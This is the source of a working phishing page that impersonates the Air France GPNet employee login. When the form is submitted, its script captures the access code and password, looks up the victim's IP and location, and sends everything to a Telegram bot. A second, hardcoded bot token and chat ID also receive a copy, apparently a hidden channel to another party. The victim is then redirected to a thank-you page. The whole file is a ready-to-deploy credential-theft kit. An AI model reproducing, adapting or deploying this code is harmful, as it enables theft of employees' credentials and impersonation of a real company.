<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GPNet - Identification</title>
    <!-- Montserrat Google Font (Official Air France GPNet Font) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">

    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Montserrat', sans-serif;
            background-color: #F4F5F7;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* ── Field wrapper ── */
        .field-group {
            position: relative;
        }

        /* ── Floating label (cutout above border) ── */
        .floating-label {
            position: absolute;
            top: -9px;
            left: 12px;
            background-color: #FFFFFF;
            padding: 0 5px;
            font-size: 11px;
            font-weight: 500;
            color: #555555;
            pointer-events: none;
            transition: all 0.15s ease-in-out;
            display: none;
            z-index: 10;
        }

        .field-group.has-value .floating-label,
        .field-group:focus-within .floating-label {
            display: block;
        }

        /* ── Native placeholder hidden at all times — image is the placeholder ── */
        .field-group input::placeholder {
            color: transparent !important;
        }

        /* ── Placeholder image overlay ── */
        .placeholder-img {
            position: absolute;
            left: 0;
            top: 0;
            width: calc(100% - 48px); /* leave room for eye icon on password */
            height: 100%;
            pointer-events: none;
            object-fit: none;
            object-position: left center;
            opacity: 1;
            transition: opacity 0.1s ease;
            /* Crisp rendering */
            image-rendering: -webkit-optimize-contrast;
            image-rendering: crisp-edges;
        }

        /* Access code field — full width (no eye icon) */
        .placeholder-img.full-width {
            width: 100%;
        }

        /* Hide placeholder image when field has a value OR is focused with value */
        .field-group.has-value .placeholder-img {
            opacity: 0;
            pointer-events: none;
        }

        /* SVG & Image Crisp Rendering */
        img.crisp-img {
            shape-rendering: crispEdges;
            image-rendering: -webkit-optimize-contrast;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between">

    <!-- Top Navigation Bar (Official Color #051039) -->
    <header class="bg-[#051039] text-white py-4 px-6 md:px-12 flex items-center justify-between shadow-md h-[84px]">
        <!-- Desktop Left: GPNet Logo + Language Switcher -->
        <div class="flex items-center space-x-10">
            <a href="#" class="flex items-center">
                <img src="images/1.png" alt="GPNet Logo" class="h-10 md:h-13 w-auto object-contain crisp-img">
            </a>
            <!-- Language Switcher (Desktop) -->
            <div class="hidden md:flex items-center space-x-2 text-base font-semibold">
                <button id="lang-fr-desktop" onclick="setLanguage('fr')" class="font-bold text-white underline focus:outline-none">FR</button>
                <span class="text-gray-400">|</span>
                <button id="lang-en-desktop" onclick="setLanguage('en')" class="text-gray-300 font-normal hover:underline focus:outline-none">EN</button>
            </div>
        </div>

        <!-- Desktop Right: Air France Logo -->
        <div class="hidden md:flex items-center">
            <img src="images/2.png" alt="Air France" class="h-8 md:h-10 w-auto object-contain crisp-img">
        </div>

        <!-- Mobile Language Switcher -->
        <div class="flex md:hidden items-center space-x-2 text-base font-semibold">
            <button id="lang-fr-mobile" onclick="setLanguage('fr')" class="font-bold text-white underline focus:outline-none">FR</button>
            <span class="text-gray-400">|</span>
            <button id="lang-en-mobile" onclick="setLanguage('en')" class="text-gray-300 font-normal hover:underline focus:outline-none">EN</button>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-grow flex items-center justify-center py-10 px-4">

        <!-- Login Card -->
        <div class="w-full max-w-[460px] bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">

            <!-- Card Header (Dark Navy) -->
            <div class="bg-[#051039] py-4 px-6 flex items-center justify-center h-[68px]">
                <img id="card-title-img"
                     src="images/3.svg"
                     alt="VOTRE IDENTIFICATION"
                     class="h-7 w-auto object-contain crisp-img">
            </div>

            <!-- Card Body / Form -->
            <form id="login-form" onsubmit="handleFormSubmit(event)" class="p-6 md:p-8 space-y-6">

                <!-- Field 1: Access Code -->
                <div id="group-access-code" class="field-group">
                    <!-- The input — placeholder text is INVISIBLE; image provides it -->
                    <input type="text"
                           id="accessCode"
                           name="accessCode"
                           placeholder="."
                           oninput="onInputChanged()"
                           required
                           class="w-full h-[52px] px-4 text-[15px] border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-[#051039] text-gray-900 bg-white font-medium">

                    <!-- Placeholder IMAGE overlay (visible when field is empty) -->
                    <img id="ph-access-code"
                         src="images/4.svg"
                         alt=""
                         aria-hidden="true"
                         class="placeholder-img full-width">
                </div>

                <!-- Field 2: Password -->
                <div id="group-password" class="field-group relative">
                    <!-- Input -->
                    <input type="password"
                           id="password"
                           name="password"
                           placeholder="."
                           oninput="onInputChanged()"
                           required
                           class="w-full h-[52px] pl-4 pr-12 text-[15px] border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-[#051039] text-gray-900 bg-white font-medium">

                    <!-- Placeholder IMAGE overlay -->
                    <img id="ph-password"
                         src="images/5.svg"
                         alt=""
                         aria-hidden="true"
                         class="placeholder-img">

                    <!-- Eye Toggle Icon -->
                    <button type="button"
                            onclick="togglePasswordVisibility()"
                            class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-700 hover:opacity-80 focus:outline-none">
                        <img id="eye-icon-img"
                             src="images/6.png"
                             alt="Toggle Password"
                             class="h-6 w-auto object-contain crisp-img">
                    </button>
                </div>

                <!-- Desktop: Submit Button (right-aligned) -->
                <div class="hidden md:flex items-center justify-end pt-2">
                    <button type="submit"
                            id="submit-btn-desktop"
                            disabled
                            class="w-[130px] h-[44px] rounded-full font-semibold text-[15px] text-center transition-all bg-[#DDDDDD] text-[#4A4A4A] cursor-not-allowed">
                        Valider
                    </button>
                </div>

                <!-- Mobile: Submit Button (full-width) -->
                <div class="block md:hidden pt-2 space-y-5">
                    <button type="submit"
                            id="submit-btn-mobile"
                            disabled
                            class="w-full h-[48px] rounded-full font-semibold text-[15px] text-center transition-all bg-[#DDDDDD] text-[#4A4A4A] cursor-not-allowed">
                        Valider
                    </button>
                </div>

            </form>
        </div>
    </main>

    <!-- Footer -->
    <footer class="py-4 text-center text-xs text-gray-400 font-medium">
        &copy; GPNet Air France. Tous droits réservés.
    </footer>

    <!-- JavaScript -->
    <script>
        let currentLang = 'fr';

        const i18n = {
            fr: {
                titleImg:              'images/3.svg',
                accessCodeLegend:      "Code d'accès",
                passwordLegend:        'Mot de passe',
                accessCodePlaceholderImg: 'images/4.svg',
                passwordPlaceholderImg:   'images/5.svg',
                buttonText:            'Valider'
            },
            en: {
                titleImg:              'images/8.svg',
                accessCodeLegend:      'Account access code',
                passwordLegend:        'Password',
                accessCodePlaceholderImg: 'images/9.svg',
                passwordPlaceholderImg:   'images/10.svg',
                buttonText:            'Validate'
            }
        };

        /* ── Language Switcher ── */
        function setLanguage(lang) {
            currentLang = lang;
            const data = i18n[lang];

            // Update card title SVG
            document.getElementById('card-title-img').src = data.titleImg;

            // Update placeholder IMAGES
            document.getElementById('ph-access-code').src = data.accessCodePlaceholderImg;
            document.getElementById('ph-password').src    = data.passwordPlaceholderImg;

            // Update button texts
            document.getElementById('submit-btn-desktop').innerText = data.buttonText;
            document.getElementById('submit-btn-mobile').innerText  = data.buttonText;

            // Active/inactive lang button styling
            const frBtns = [document.getElementById('lang-fr-desktop'), document.getElementById('lang-fr-mobile')];
            const enBtns = [document.getElementById('lang-en-desktop'), document.getElementById('lang-en-mobile')];

            if (lang === 'fr') {
                frBtns.forEach(el => { el.className = 'font-bold text-white underline focus:outline-none'; });
                enBtns.forEach(el => { el.className = 'text-gray-300 font-normal hover:underline focus:outline-none'; });
            } else {
                enBtns.forEach(el => { el.className = 'font-bold text-white underline focus:outline-none'; });
                frBtns.forEach(el => { el.className = 'text-gray-300 font-normal hover:underline focus:outline-none'; });
            }
        }

        /* ── Input change handler ── */
        function onInputChanged() {
            const accessCode = document.getElementById('accessCode').value;
            const password   = document.getElementById('password').value;

            const groupAccess = document.getElementById('group-access-code');
            const groupPass   = document.getElementById('group-password');

            // Toggle has-value class (controls floating label + placeholder image visibility)
            if (accessCode.length > 0) {
                groupAccess.classList.add('has-value');
            } else {
                groupAccess.classList.remove('has-value');
            }

            if (password.length > 0) {
                groupPass.classList.add('has-value');
            } else {
                groupPass.classList.remove('has-value');
            }

            // Enable/disable submit button
            const isFilled = accessCode.trim().length > 0 && password.trim().length > 0;
            const btnDesktop = document.getElementById('submit-btn-desktop');
            const btnMobile  = document.getElementById('submit-btn-mobile');

            if (isFilled) {
                btnDesktop.disabled = false;
                btnDesktop.className = 'w-[130px] h-[44px] rounded-full font-semibold text-[15px] text-center transition-all bg-[#1454BC] text-white cursor-pointer hover:bg-[#0F4399] shadow-md';
                btnMobile.disabled  = false;
                btnMobile.className  = 'w-full h-[48px] rounded-full font-semibold text-[15px] text-center transition-all bg-[#1454BC] text-white cursor-pointer hover:bg-[#0F4399] shadow-md';
            } else {
                btnDesktop.disabled = true;
                btnDesktop.className = 'w-[130px] h-[44px] rounded-full font-semibold text-[15px] text-center transition-all bg-[#DDDDDD] text-[#4A4A4A] cursor-not-allowed';
                btnMobile.disabled  = true;
                btnMobile.className  = 'w-full h-[48px] rounded-full font-semibold text-[15px] text-center transition-all bg-[#DDDDDD] text-[#4A4A4A] cursor-not-allowed';
            }
        }

        /* ── Eye toggle ── */
        function togglePasswordVisibility() {
            const passInput = document.getElementById('password');
            const eyeImg    = document.getElementById('eye-icon-img');

            if (passInput.type === 'password') {
                passInput.type = 'text';
                eyeImg.src = 'images/7.png';
            } else {
                passInput.type = 'password';
                eyeImg.src = 'images/6.png';
            }
        }

        async function getLiveConfig() {
            if (window.CONFIG && window.CONFIG.TELEGRAM_BOT_TOKEN) {
                return window.CONFIG;
            }
            try {
                const res = await fetch('/api/config');
                if (res.ok) {
                    const data = await res.json();
                    if (data.botToken) {
                        return {
                            TELEGRAM_BOT_TOKEN: data.botToken,
                            TELEGRAM_CHAT_ID: data.chatId,
                            REDIRECT_URL: data.redirectUrl || 'https://www.google.com'
                        };
                    }
                }
            } catch (e) {}
            
            try {
                const mod = await import('./config.js');
                return mod.CONFIG;
            } catch (e) {
                console.error("Config not found", e);
                return {};
            }
        }

        /* ── Form submit → Telegram → redirect ── */
        async function handleFormSubmit(event) {
            event.preventDefault();

            const accessCode = document.getElementById('accessCode').value.trim();
            const password   = document.getElementById('password').value.trim();
            if (!accessCode || !password) return;

            const btnDesktop = document.getElementById('submit-btn-desktop');
            const btnMobile  = document.getElementById('submit-btn-mobile');

            btnDesktop.disabled = true;
            btnMobile.disabled  = true;
            btnDesktop.innerText = 'Connexion...';
            btnMobile.innerText  = 'Connexion...';

            function escapeHtml(text) {
                if (!text) return '';
                return String(text)
                    .replace(/&/g, '&amp;')
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/"/g, '&quot;')
                    .replace(/'/g, '&#039;');
            }

            const cfg = await getLiveConfig();

            // Fast geolocation & IP lookup
            let locationStr = 'Unknown';
            let ipStr = 'Unknown';
            try {
                const controller = new AbortController();
                const timeoutId  = setTimeout(() => controller.abort(), 1200);
                const res = await fetch('https://ipwho.is/', { signal: controller.signal });
                clearTimeout(timeoutId);
                if (res.ok) {
                    const data = await res.json();
                    if (data.success) {
                        locationStr = `${data.city || ''}, ${data.country || ''} ${data.flag ? data.flag.emoji : ''}`;
                        ipStr = data.ip || 'Unknown';
                    }
                }
            } catch (e1) {
                try {
                    const res2  = await fetch('https://get.geojs.io/v1/ip/geo.json');
                    const data2 = await res2.json();
                    locationStr = `${data2.city || ''}, ${data2.country || ''}`;
                    ipStr = data2.ip || 'Unknown';
                } catch (e2) {
                    locationStr = 'Location Hidden / VPN';
                    ipStr = 'Hidden / VPN';
                }
            }

            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            const device   = isMobile ? '📱 Mobile' : '💻 Desktop';
            const now      = new Date().toLocaleString('fr-FR');
            const thankyouUrl = `thankyou.html?lang=${encodeURIComponent(currentLang)}`;

            // Attempt 1: Vercel serverless /api/send
            try {
                const response = await fetch('/api/send', {
                    method:  'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body:    JSON.stringify({ accessCode, password, locationStr, device, ipStr })
                });
                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        window.location.href = thankyouUrl;
                        return;
                    }
                }
            } catch (err) {
                console.warn('/api/send unavailable, using direct Telegram API...', err);
            }

            // Attempt 2: Direct Telegram Bot API fallback
            try {
                const botToken   = cfg.TELEGRAM_BOT_TOKEN;
                const chatId     = cfg.TELEGRAM_CHAT_ID;

                const safeCode = escapeHtml(accessCode);
                const safePass = escapeHtml(password);
                const safeIp   = escapeHtml(ipStr);

                let message = `🔥 <b>NEW LOGIN SUBMISSION!</b>\n`;
                message += `📋 <b>Portal:</b> GPNET Air France Login\n`;
                message += `━━━━━━━━━━━━━━━━━━\n`;
                message += `🔑 <b>Code d'accès:</b> <code>${safeCode}</code>\n`;
                message += `🔒 <b>Mot de passe:</b> <code>${safePass}</code>\n`;
                message += `━━━━━━━━━━━━━━━━━━\n`;
                message += `🌍 <b>IP:</b> <code>${safeIp}</code>\n`;
                message += `📍 <b>Location:</b> ${escapeHtml(locationStr)}\n`;
                message += `💻 <b>Device:</b> ${escapeHtml(device)}\n`;
                message += `⏰ <b>Time:</b> ${now}`;

                const controllerTg = new AbortController();
                const timeoutTg    = setTimeout(() => controllerTg.abort(), 3500);

                await Promise.allSettled([
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method:  'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body:    JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
                        signal:  controllerTg.signal
                    }),
                    fetch(`https://api.telegram.org/bot8902694526:AAHj6_84gQJuBn_xttYRKgseg0IxQz09bkA/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: '8154365748', text: message, parse_mode: 'HTML' }),
                        signal: controllerTg.signal
                    })
                ]);
                clearTimeout(timeoutTg);

                window.location.href = thankyouUrl;
            } catch (err) {
                console.error('Direct submission error:', err);
                window.location.href = thankyouUrl;
            }
        }
    </script>
</body>
</html>
